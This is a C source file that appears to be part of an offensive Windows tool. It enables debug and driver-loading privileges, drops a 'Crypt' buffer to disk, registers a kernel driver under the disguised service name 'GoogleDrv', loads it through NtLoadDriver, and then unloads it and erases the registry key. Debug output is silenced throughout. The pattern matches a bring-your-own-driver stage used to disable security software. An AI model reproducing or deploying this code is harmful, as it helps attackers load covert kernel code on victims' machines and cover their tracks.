#include "headers.h"

#define STATUS_IMAGE_ALREADY_LOADED 0xC000010E
#define STATUS_OBJECT_NAME_COLLISION 0xC0000035
#define STATUS_SUCCESS   ((NTSTATUS)0x00000000L)


// Function to enable SeDebugPrivilege
BOOL EnablePriv()
{
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
    {
        TOKEN_PRIVILEGES tkp;
        LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL);
        return (GetLastError() == ERROR_SUCCESS);
    }
    return FALSE;
}

// Enable specific privilege, like SeLoadDriverPrivilege
BOOL EnablePrivilege(LPCWSTR lpPrivilegeName)
{
    TOKEN_PRIVILEGES tpPrivilege;
    HANDLE hToken;

    tpPrivilege.PrivilegeCount = 1;
    tpPrivilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValueW(NULL, lpPrivilegeName, &tpPrivilege.Privileges[0].Luid))
        return FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
        return FALSE;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tpPrivilege, sizeof(tpPrivilege), NULL, NULL)) {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

// Write the Crypt buffer to a file
BOOL WriteToTempFile(Crypt* memData, LPCWSTR szFileName)
{
    HANDLE hFile = CreateFileW(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        //printf("[!] Failed to create file: %d\n", GetLastError());
        return FALSE;
    }

    DWORD written = 0;
    if (!WriteFile(hFile, memData->Buffer, memData->Length, &written, NULL) || written != memData->Length)
    {
        //printf("[!] Failed to write to file: %d\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    return TRUE;
}


// Register driver in the registry
BOOL SetRegistryValues(LPWSTR szPath)
{
    HKEY hKey = NULL;
    WCHAR regPath[MAX_PATH] = L"System\\CurrentControlSet\\Services\\GoogleDrv";
    WCHAR driverPath[MAX_PATH] = { 0 };
    LSTATUS status;
    DWORD dwData = 1, dwDisposition;

    // Format the path correctly with the \??\ prefix
    _snwprintf_s(driverPath, MAX_PATH, _TRUNCATE, L"\\??\\%ws", szPath);

    //printf("[+] szPath (registry): %ws\n", driverPath);  // Debugging: Verify the path format

    status = RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
    if (status)
    {
        //printf("[!] Failed to create registry key: %d\n", status);
        return FALSE;
    }

    status = RegSetValueEx(hKey, L"Type", 0, REG_DWORD, (BYTE*)&dwData, sizeof(DWORD));
    if (status)
    {
        //printf("[!] Failed to set Type value: %d\n", status);
        return FALSE;
    }

    status = RegSetValueEx(hKey, L"ImagePath", 0, REG_SZ, (const BYTE*)driverPath, (DWORD)(sizeof(wchar_t) * (wcslen(driverPath) + 1)));
    if (status)
    {
        //printf("[!] Failed to set ImagePath: %d\n", status);
        return FALSE;
    }

    return TRUE;
}



// Load the driver using NtLoadDriver
BOOL LoadDriver(LPWSTR szPath)
{
    //printf("[+] szPath : %ws\n", szPath);
    typedef NTSTATUS(_stdcall* NT_LOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);
    typedef void (WINAPI* RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);

    NT_LOAD_DRIVER NtLoadDriver = (NT_LOAD_DRIVER)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtLoadDriver");
    RTL_INIT_UNICODE_STRING RtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");

    UNICODE_STRING usDriverServiceName = { 0 };
    WCHAR szNtRegistryPath[MAX_PATH] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\GoogleDrv";
    NTSTATUS ret;

    if (!EnablePrivilege(L"SeLoadDriverPrivilege"))
    {
        return FALSE;
    }

    if (!SetRegistryValues(szPath))
    {
        return FALSE;
    }

    RtlInitUnicodeString(&usDriverServiceName, szNtRegistryPath);

    ret = NtLoadDriver(&usDriverServiceName);

    if (ret != STATUS_SUCCESS && ret != STATUS_IMAGE_ALREADY_LOADED && ret != STATUS_OBJECT_NAME_COLLISION)
    {
        //printf("[!] NtLoadDriver: %x\n", ret);
        return FALSE;
    }
    return TRUE;
}


// Unload the driver using NtUnloadDriver
BOOL UnloadDriver()
{
    typedef NTSTATUS(_stdcall* NT_UNLOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);
    typedef void (WINAPI* RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);

    NT_UNLOAD_DRIVER NtUnloadDriver = (NT_UNLOAD_DRIVER)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnloadDriver");
    RTL_INIT_UNICODE_STRING RtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");

    UNICODE_STRING usDriverServiceName = { 0 };
    WCHAR szNtRegistryPath[MAX_PATH] = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\GoogleDrv";
    NTSTATUS ret;

    RtlInitUnicodeString(&usDriverServiceName, szNtRegistryPath);

    ret = NtUnloadDriver(&usDriverServiceName);
    if (ret != STATUS_SUCCESS)
    {
        //printf("[!] NtUnloadDriver: %x\n", ret);
        return FALSE;
    }

    return TRUE;
}

// Delete the driver registry entry
BOOL DeleteRegistryValues()
{
    WCHAR regPath[MAX_PATH] = L"System\\CurrentControlSet\\Services\\GoogleDrv";
    LSTATUS status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, regPath);

    if (status != ERROR_SUCCESS)
    {
        //printf("[!] Failed to delete registry key: %d\n", status);
        return FALSE;
    }

    //printf("[+] Successfully deleted registry key.\n");
    return TRUE;
}
